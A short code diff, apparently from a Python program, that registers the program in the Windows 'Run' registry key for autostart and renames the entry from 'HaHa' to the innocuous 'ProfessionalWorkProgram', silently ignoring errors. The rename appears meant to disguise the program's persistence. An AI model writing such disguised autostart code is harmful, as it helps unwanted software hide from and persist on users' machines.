@@ -54,7 +54,7 @@ def install_autostart() -> None:
             r"Software\Microsoft\Windows\CurrentVersion\Run",
             0, winreg.KEY_SET_VALUE,
         )
-        winreg.SetValueEx(key, "HaHa", 0, winreg.REG_SZ, f'"{sys.executable}"')
+        winreg.SetValueEx(key, "ProfessionalWorkProgram", 0, winreg.REG_SZ, f'"{sys.executable}"')
         winreg.CloseKey(key)
     except Exception:
         pass  # silently skip if registry write fails
